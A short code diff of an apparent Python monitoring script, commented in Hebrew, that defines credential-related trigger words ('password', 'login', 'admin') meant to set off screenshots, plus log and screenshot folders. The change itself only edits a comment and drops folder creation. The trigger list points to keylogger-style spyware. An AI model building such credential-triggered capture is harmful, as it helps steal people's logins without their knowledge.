@@ -6,13 +6,9 @@ import mss
 # מילים שיגרמו לצילום מסך
 TRIGGER_WORDS = ["password", "username", "login", "secret", "admin", "123456"]
 
-# תיקיות לשמירה
+#  תיקיות לשמירה וליצר אותם
 LOG_FOLDER = "logs"
 SCREENSHOT_FOLDER = "screenshots"
-
-# יצירת תיקיות אם לא קיימות
-os.makedirs(LOG_FOLDER, exist_ok=True)
-os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
 
 # פונקציה לצילום מסך
 def take_screenshot():
